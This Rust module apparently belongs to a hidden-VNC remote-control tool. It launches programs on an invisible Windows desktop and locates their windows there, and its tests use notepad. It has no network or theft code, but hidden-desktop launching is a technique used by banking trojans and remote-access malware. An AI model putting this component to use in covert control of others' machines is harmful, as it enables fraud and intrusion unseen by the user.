//! Application launcher for hidden desktop

use crate::{HvncError, Result};
use crate::host::DesktopHandle;
use std::ffi::{CString, OsString};
use std::mem;
use std::ptr;
use std::os::windows::ffi::OsStringExt;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use winapi::shared::windef::HWND;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::CREATE_NEW_CONSOLE;
const STARTF_USEDESKTOP: u32 = 0x00000001;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winuser::{EnumWindows, GetWindowTextW, GetWindowThreadProcessId, IsWindowVisible, GetThreadDesktop, SetThreadDesktop};
use winapi::um::processthreadsapi::GetCurrentThreadId;

/// Process ID type
pub type ProcessId = u32;

/// Window handle type
pub type WindowHandle = HWND;

/// Application launcher for hidden desktop
pub struct AppLauncher;

impl AppLauncher {
    /// Launch an application in the specified desktop
    pub fn launch_in_desktop(
        desktop: DesktopHandle,
        app_path: &str,
    ) -> Result<ProcessId> {
        launch_app_in_desktop(desktop, app_path)
    }
    
    /// Find a window by process ID and title pattern
    pub fn find_window(
        process_id: ProcessId,
        title_pattern: &str,
    ) -> Result<WindowHandle> {
        find_window(process_id, title_pattern)
    }
    
    /// Find a window by process ID and title pattern in a hidden desktop
    pub fn find_window_in_desktop(
        desktop: DesktopHandle,
        process_id: ProcessId,
        title_pattern: &str,
    ) -> Result<WindowHandle> {
        find_window_in_desktop(desktop, process_id, title_pattern)
    }
}

/// Launch an application on the main desktop using CreateProcessA API
pub fn launch_app(app_path: &str) -> Result<ProcessId> {
    // Convert application path to C string
    let c_app_path = CString::new(app_path)
        .map_err(|e| HvncError::application_not_found(format!("Invalid application path: {}", e)))?;
    
    // Initialize STARTUPINFOA structure (no specific desktop)
    let mut startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;
    // No desktop specified - launches on current/main desktop
    
    // Initialize PROCESS_INFORMATION structure
    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    // Create the process
    let success = unsafe {
        CreateProcessA(
            ptr::null(),                    // Application name (null to use command line)
            c_app_path.as_ptr() as *mut i8, // Command line
            ptr::null_mut(),                // Process security attributes
            ptr::null_mut(),                // Thread security attributes
            0,                              // Inherit handles (FALSE)
            CREATE_NEW_CONSOLE,             // Creation flags
            ptr::null_mut(),                // Environment
            ptr::null(),                    // Current directory
            &mut startup_info,              // Startup info
            &mut process_info,              // Process info
        )
    };
    
    if success == 0 {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(HvncError::application_launch_failed(
            app_path,
            format!("Windows error code {}", error_code)
        ));
    }
    
    // Get the process ID
    let process_id = process_info.dwProcessId;
    
    // Clean up handles
    unsafe {
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }
    
    Ok(process_id)
}

/// Launch an application in the specified hidden desktop using CreateProcessA API
pub fn launch_app_in_desktop(desktop: DesktopHandle, app_path: &str) -> Result<ProcessId> {
    // Convert application path to C string
    let c_app_path = CString::new(app_path)
        .map_err(|e| HvncError::application_not_found(format!("Invalid application path: {}", e)))?;
    
    // Get desktop name for STARTUPINFOA
    let desktop_name = get_desktop_name(desktop)?;
    let c_desktop_name = CString::new(desktop_name)
        .map_err(|e| HvncError::desktop_creation("desktop", format!("Invalid desktop name: {}", e)))?;
    
    // Initialize STARTUPINFOA structure
    let mut startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;
    startup_info.dwFlags = STARTF_USEDESKTOP;
    startup_info.lpDesktop = c_desktop_name.as_ptr() as *mut i8;
    
    // Initialize PROCESS_INFORMATION structure
    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    // Create the process
    let success = unsafe {
        CreateProcessA(
            ptr::null(),                    // Application name (null to use command line)
            c_app_path.as_ptr() as *mut i8, // Command line
            ptr::null_mut(),                // Process security attributes
            ptr::null_mut(),                // Thread security attributes
            0,                              // Inherit handles (FALSE)
            CREATE_NEW_CONSOLE,             // Creation flags
            ptr::null_mut(),                // Environment
            ptr::null(),                    // Current directory
            &mut startup_info,              // Startup info
            &mut process_info,              // Process info
        )
    };
    
    if success == 0 {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(HvncError::application_launch_failed(
            app_path,
            format!("Windows error code {}", error_code)
        ));
    }
    
    // Get the process ID
    let process_id = process_info.dwProcessId;
    
    // Clean up handles
    unsafe {
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }
    
    Ok(process_id)
}

/// Get the name of a desktop from its handle
fn get_desktop_name(desktop: DesktopHandle) -> Result<String> {
    use winapi::um::winuser::{GetUserObjectInformationA, UOI_NAME};
    
    // First, get the required buffer size
    let mut required_size: u32 = 0;
    unsafe {
        GetUserObjectInformationA(
            desktop as *mut _,
            UOI_NAME as i32,
            ptr::null_mut(),
            0,
            &mut required_size,
        );
    }
    
    if required_size == 0 {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(HvncError::desktop_creation(
            "desktop",
            format!("Failed to get desktop name buffer size: Windows error code {}", error_code)
        ));
    }
    
    // Allocate buffer and get the desktop name
    let mut buffer = vec![0u8; required_size as usize];
    let success = unsafe {
        GetUserObjectInformationA(
            desktop as *mut _,
            UOI_NAME as i32,
            buffer.as_mut_ptr() as *mut _,
            required_size,
            &mut required_size,
        )
    };
    
    if success == 0 {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(HvncError::desktop_creation(
            "desktop",
            format!("Failed to get desktop name: Windows error code {}", error_code)
        ));
    }
    
    // Convert to string, removing null terminator
    let name_len = buffer.iter().position(|&b| b == 0).unwrap_or(buffer.len());
    let name = String::from_utf8(buffer[..name_len].to_vec())
        .map_err(|e| HvncError::desktop_creation("desktop", format!("Invalid desktop name encoding: {}", e)))?;
    
    Ok(name)
}

/// Structure to hold window enumeration context
struct WindowEnumContext {
    target_process_id: ProcessId,
    title_pattern: String,
    found_window: Option<WindowHandle>,
    timeout: Instant,
    search_hidden_desktop: bool,  // New field to indicate if we're searching in hidden desktop
}

/// Find a window by process ID and title pattern in a hidden desktop
pub fn find_window_in_desktop(desktop: DesktopHandle, process_id: ProcessId, title_pattern: &str) -> Result<WindowHandle> {
    // Set a timeout for window enumeration (5 seconds)
    let timeout = Instant::now() + Duration::from_secs(5);
    
    // Switch to the hidden desktop context for enumeration
    let original_desktop = unsafe { winapi::um::winuser::GetThreadDesktop(winapi::um::processthreadsapi::GetCurrentThreadId()) };
    if original_desktop.is_null() {
        return Err(HvncError::window_not_found("Failed to get current thread desktop".to_string()));
    }
    
    // Switch to the target desktop
    let switch_result = unsafe { winapi::um::winuser::SetThreadDesktop(desktop) };
    if switch_result == 0 {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(HvncError::window_not_found(format!(
            "Failed to switch to hidden desktop for window enumeration: error code {}", error_code
        )));
    }
    
    // Create context for window enumeration
    let context = Arc::new(Mutex::new(WindowEnumContext {
        target_process_id: process_id,
        title_pattern: title_pattern.to_string(),
        found_window: None,
        timeout,
        search_hidden_desktop: true,  // Enable hidden desktop search mode
    }));
    
    // Retry window finding with a timeout
    let start_time = Instant::now();
    let max_duration = Duration::from_secs(10);
    let mut result = Err(HvncError::window_not_found("Window not found".to_string()));
    
    while start_time.elapsed() < max_duration {
        // Clone context for the callback
        let context_clone = Arc::clone(&context);
        
        // Enumerate all windows in this desktop
        let success = unsafe {
            EnumWindows(Some(enum_windows_proc), context_clone.as_ref() as *const _ as isize)
        };
        
        // Check if we found a window
        {
            let ctx = context.lock().unwrap();
            if let Some(window) = ctx.found_window {
                result = Ok(window);
                break;
            }
        }
        
        // If enumeration failed, set error
        if success == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            result = Err(HvncError::window_not_found(format!(
                "Window enumeration failed in hidden desktop: Windows error code {}",
                error_code
            )));
            break;
        }
        
        // Wait a bit before retrying
        std::thread::sleep(Duration::from_millis(100));
    }
    
    // Restore original desktop
    unsafe {
        winapi::um::winuser::SetThreadDesktop(original_desktop);
    }
    
    // Return the final result
    if result.is_ok() {
        result
    } else {
        Err(HvncError::window_not_found(format!(
            "Window not found for process {} with title pattern '{}' in hidden desktop within timeout",
            process_id, title_pattern
        )))
    }
}
pub fn find_window(process_id: ProcessId, title_pattern: &str) -> Result<WindowHandle> {
    // Set a timeout for window enumeration (5 seconds)
    let timeout = Instant::now() + Duration::from_secs(5);
    
    // Create context for window enumeration
    let context = Arc::new(Mutex::new(WindowEnumContext {
        target_process_id: process_id,
        title_pattern: title_pattern.to_string(),
        found_window: None,
        timeout,
        search_hidden_desktop: false,  // Default to false for regular desktop search
    }));
    
    // Retry window finding with a timeout
    let start_time = Instant::now();
    let max_duration = Duration::from_secs(10);
    
    while start_time.elapsed() < max_duration {
        // Clone context for the callback
        let context_clone = Arc::clone(&context);
        
        // Enumerate all windows
        let success = unsafe {
            EnumWindows(Some(enum_windows_proc), context_clone.as_ref() as *const _ as isize)
        };
        
        // Check if we found a window
        {
            let ctx = context.lock().unwrap();
            if let Some(window) = ctx.found_window {
                return Ok(window);
            }
        }
        
        // If enumeration failed, return error
        if success == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            return Err(HvncError::window_not_found(format!(
                "Window enumeration failed: Windows error code {}",
                error_code
            )));
        }
        
        // Wait a bit before retrying
        std::thread::sleep(Duration::from_millis(100));
    }
    
    Err(HvncError::window_not_found(format!(
        "Window not found for process {} with title pattern '{}' within timeout",
        process_id, title_pattern
    )))
}

/// Callback function for EnumWindows
unsafe extern "system" fn enum_windows_proc(hwnd: HWND, lparam: isize) -> i32 {
    let context_ptr = lparam as *const Mutex<WindowEnumContext>;
    let context_arc = Arc::from_raw(context_ptr);
    let context_clone = Arc::clone(&context_arc);
    std::mem::forget(context_arc); // Don't drop the Arc
    
    let mut context = match context_clone.lock() {
        Ok(ctx) => ctx,
        Err(_) => return 1, // Continue enumeration on lock error
    };
    
    // Check timeout
    if Instant::now() > context.timeout {
        return 0; // Stop enumeration due to timeout
    }
    
    // Skip invisible windows only if we're not searching in a hidden desktop
    // Windows in hidden desktops appear "invisible" to the main desktop but are still valid
    if !context.search_hidden_desktop && IsWindowVisible(hwnd) == 0 {
        return 1; // Continue enumeration
    }
    
    // Get the process ID of this window
    let mut window_process_id: u32 = 0;
    GetWindowThreadProcessId(hwnd, &mut window_process_id);
    
    // Check if this window belongs to our target process
    if window_process_id != context.target_process_id {
        return 1; // Continue enumeration
    }
    
    // Get the window title
    let mut title_buffer = [0u16; 256];
    let title_length = GetWindowTextW(hwnd, title_buffer.as_mut_ptr(), title_buffer.len() as i32);
    
    // If empty pattern is provided, accept any visible window for this process
    if context.title_pattern.is_empty() {
        context.found_window = Some(hwnd);
        return 0; // Stop enumeration - we found a window for the process
    }
    
    if title_length > 0 {
        // Convert UTF-16 to String
        let title_slice = &title_buffer[..title_length as usize];
        let title = OsString::from_wide(title_slice).to_string_lossy().to_string();
        
        // Check if the title matches our pattern (case-insensitive contains)
        if title.to_lowercase().contains(&context.title_pattern.to_lowercase()) {
            context.found_window = Some(hwnd);
            return 0; // Stop enumeration - we found our window
        }
    }
    
    1 // Continue enumeration
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::host::desktop::create_hidden_desktop;
    use std::time::Duration;
    
    #[test]
    fn test_launch_app_in_desktop_success() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_launcher_desktop")
            .expect("Desktop creation should succeed");
        
        // Launch notepad.exe as a test application
        let result = launch_app_in_desktop(desktop.handle(), "notepad.exe");
        
        assert!(result.is_ok(), "Application launch should succeed");
        
        let process_id = result.unwrap();
        assert!(process_id > 0, "Process ID should be greater than 0");
        
        // Clean up: terminate the process
        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id,
            );
            if !handle.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                CloseHandle(handle);
            }
        }
    }
    
    #[test]
    fn test_launch_app_in_desktop_invalid_path() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_launcher_invalid")
            .expect("Desktop creation should succeed");
        
        // Try to launch a non-existent application
        let result = launch_app_in_desktop(desktop.handle(), "nonexistent_app.exe");
        
        assert!(result.is_err(), "Launch should fail for non-existent application");
        
        if let Err(HvncError::ApplicationNotFound { name }) = result {
            assert!(name.contains("Failed to launch application"), "Error should mention launch failure");
        } else {
            panic!("Expected ApplicationNotFound error");
        }
    }
    
    #[test]
    fn test_launch_app_in_desktop_empty_path() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_launcher_empty")
            .expect("Desktop creation should succeed");
        
        // Try to launch with empty path
        let result = launch_app_in_desktop(desktop.handle(), "");
        
        assert!(result.is_err(), "Launch should fail for empty path");
    }
    
    #[test]
    fn test_launch_app_in_desktop_with_arguments() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_launcher_args")
            .expect("Desktop creation should succeed");
        
        // Launch notepad with a specific file (this will fail but test the path parsing)
        let result = launch_app_in_desktop(desktop.handle(), "notepad.exe test.txt");
        
        // This should succeed (notepad will just show an error dialog for missing file)
        assert!(result.is_ok(), "Application launch with arguments should succeed");
        
        if let Ok(process_id) = result {
            // Clean up: terminate the process
            unsafe {
                let handle = winapi::um::processthreadsapi::OpenProcess(
                    winapi::um::winnt::PROCESS_TERMINATE,
                    0,
                    process_id,
                );
                if !handle.is_null() {
                    winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                    CloseHandle(handle);
                }
            }
        }
    }
    
    #[test]
    fn test_launch_app_in_desktop_null_chars() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_launcher_null")
            .expect("Desktop creation should succeed");
        
        // Try to launch with null character in path
        let result = launch_app_in_desktop(desktop.handle(), "notepad\0.exe");
        
        assert!(result.is_err(), "Launch should fail for path with null character");
        
        if let Err(HvncError::ApplicationNotFound { name }) = result {
            assert!(name.contains("Invalid application path"), "Error should mention invalid path");
        } else {
            panic!("Expected ApplicationNotFound error");
        }
    }
    
    #[test]
    fn test_get_desktop_name() {
        // Create a hidden desktop with a known name
        let desktop_name = "test_name_desktop";
        let desktop = create_hidden_desktop(desktop_name)
            .expect("Desktop creation should succeed");
        
        // Get the desktop name
        let result = get_desktop_name(desktop.handle());
        
        assert!(result.is_ok(), "Getting desktop name should succeed");
        
        let retrieved_name = result.unwrap();
        assert_eq!(retrieved_name, desktop_name, "Retrieved name should match original");
    }
    
    #[test]
    fn test_app_launcher_struct() {
        // Test the AppLauncher struct wrapper
        let desktop = create_hidden_desktop("test_struct_desktop")
            .expect("Desktop creation should succeed");
        
        let result = AppLauncher::launch_in_desktop(desktop.handle(), "notepad.exe");
        
        assert!(result.is_ok(), "AppLauncher should work correctly");
        
        if let Ok(process_id) = result {
            // Clean up: terminate the process
            unsafe {
                let handle = winapi::um::processthreadsapi::OpenProcess(
                    winapi::um::winnt::PROCESS_TERMINATE,
                    0,
                    process_id,
                );
                if !handle.is_null() {
                    winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                    CloseHandle(handle);
                }
            }
        }
    }
    
    #[test]
    fn test_find_window_success() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_find_window")
            .expect("Desktop creation should succeed");
        
        // Launch notepad.exe as a test application
        let process_id = launch_app_in_desktop(desktop.handle(), "notepad.exe")
            .expect("Application launch should succeed");
        
        // Wait a moment for the window to appear
        std::thread::sleep(Duration::from_millis(500));
        
        // Try to find the notepad window
        let result = find_window(process_id, "Notepad");
        
        // Clean up: terminate the process
        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id,
            );
            if !handle.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                CloseHandle(handle);
            }
        }
        
        assert!(result.is_ok(), "Window should be found");
        
        let window_handle = result.unwrap();
        assert!(!window_handle.is_null(), "Window handle should not be null");
    }
    
    #[test]
    fn test_find_window_case_insensitive() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_find_window_case")
            .expect("Desktop creation should succeed");
        
        // Launch notepad.exe as a test application
        let process_id = launch_app_in_desktop(desktop.handle(), "notepad.exe")
            .expect("Application launch should succeed");
        
        // Wait a moment for the window to appear
        std::thread::sleep(Duration::from_millis(500));
        
        // Try to find the notepad window with different case
        let result = find_window(process_id, "notepad");
        
        // Clean up: terminate the process
        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id,
            );
            if !handle.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                CloseHandle(handle);
            }
        }
        
        assert!(result.is_ok(), "Window should be found with case-insensitive search");
    }
    
    #[test]
    fn test_find_window_partial_title() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_find_window_partial")
            .expect("Desktop creation should succeed");
        
        // Launch notepad.exe as a test application
        let process_id = launch_app_in_desktop(desktop.handle(), "notepad.exe")
            .expect("Application launch should succeed");
        
        // Wait a moment for the window to appear
        std::thread::sleep(Duration::from_millis(500));
        
        // Try to find the notepad window with partial title
        let result = find_window(process_id, "Note");
        
        // Clean up: terminate the process
        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id,
            );
            if !handle.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                CloseHandle(handle);
            }
        }
        
        assert!(result.is_ok(), "Window should be found with partial title match");
    }
    
    #[test]
    fn test_find_window_not_found() {
        // Try to find a window for a non-existent process
        let result = find_window(99999, "NonExistentWindow");
        
        assert!(result.is_err(), "Should fail to find window for non-existent process");
        
        if let Err(HvncError::WindowNotFound { title }) = result {
            assert!(title.contains("Window not found"), "Error should mention window not found");
            assert!(title.contains("99999"), "Error should mention the process ID");
        } else {
            panic!("Expected WindowNotFound error");
        }
    }
    
    #[test]
    fn test_find_window_wrong_title() {
        // Create a hidden desktop for testing
        let desktop = create_hidden_desktop("test_find_window_wrong_title")
            .expect("Desktop creation should succeed");
        
        // Launch notepad.exe as a test application
        let process_id = launch_app_in_desktop(desktop.handle(), "notepad.exe")
            .expect("Application launch should succeed");
        
        // Wait a moment for the window to appear
        std::thread::sleep(Duration::from_millis(500));
        
        // Try to find the window with wrong title pattern
        let result = find_window(process_id, "WrongTitle");
        
        // Clean up: terminate the process
        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id,
            );
            if !handle.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                CloseHandle(handle);
            }
        }
        
        assert!(result.is_err(), "Should fail to find window with wrong title");
        
        if let Err(HvncError::WindowNotFound { title }) = result {
            assert!(title.contains("Window not found"), "Error should mention window not found");
            assert!(title.contains("WrongTitle"), "Error should mention the title pattern");
        } else {
            panic!("Expected WindowNotFound error");
        }
    }
    
    #[test]
    fn test_app_launcher_find_window() {
        // Test the AppLauncher struct wrapper for find_window
        let desktop = create_hidden_desktop("test_launcher_find")
            .expect("Desktop creation should succeed");
        
        // Launch notepad.exe as a test application
        let process_id = AppLauncher::launch_in_desktop(desktop.handle(), "notepad.exe")
            .expect("Application launch should succeed");
        
        // Wait a moment for the window to appear
        std::thread::sleep(Duration::from_millis(500));
        
        // Try to find the notepad window using AppLauncher
        let result = AppLauncher::find_window(process_id, "Notepad");
        
        // Clean up: terminate the process
        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id,
            );
            if !handle.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(handle, 0);
                CloseHandle(handle);
            }
        }
        
        assert!(result.is_ok(), "AppLauncher find_window should work correctly");
        
        let window_handle = result.unwrap();
        assert!(!window_handle.is_null(), "Window handle should not be null");
    }
}